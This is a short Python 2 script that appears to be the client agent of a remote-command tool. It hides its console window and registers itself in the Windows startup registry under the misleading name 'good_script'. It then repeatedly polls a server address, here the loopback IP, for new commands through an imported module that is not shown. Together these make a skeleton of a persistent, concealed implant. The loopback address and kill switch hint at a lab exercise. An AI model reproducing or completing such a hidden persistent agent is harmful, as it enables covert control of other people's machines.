import time
import operations
import windows_exe_startup_register
from optparse import OptionParser
import ctypes



WAIT_INTERVAL = 10
KILL_SWITCH = 60
SILENT = True
SERVER_IP = "127.0.0.1"


def hide_console():
    hWnd = ctypes.WinDLL('user32').GetForegroundWindow()
    if hWnd:
        ctypes.WinDLL('user32').ShowWindow(hWnd, 0)


def parse_command_line_arguments():
    parser = OptionParser("usage: %prog -s")
    parser.add_option("-s", dest="silent", help="run silently", default=False, action="store_true")
    (options, args) = parser.parse_args()
    if options.silent:
        global SILENT
        SILENT = True


if __name__ == '__main__':
    parse_command_line_arguments()
    if SILENT:
        hide_console()
    windows_exe_startup_register.register_on_registry(__file__, "good_script")
    print "***Agent Started***"
    print "Waiting for new commands"
    counter = 0
    while counter < KILL_SWITCH:
        operations.check_for_new_command(SERVER_IP)
        time.sleep(WAIT_INTERVAL)
        counter +=1

    print "***Agent Exiting***"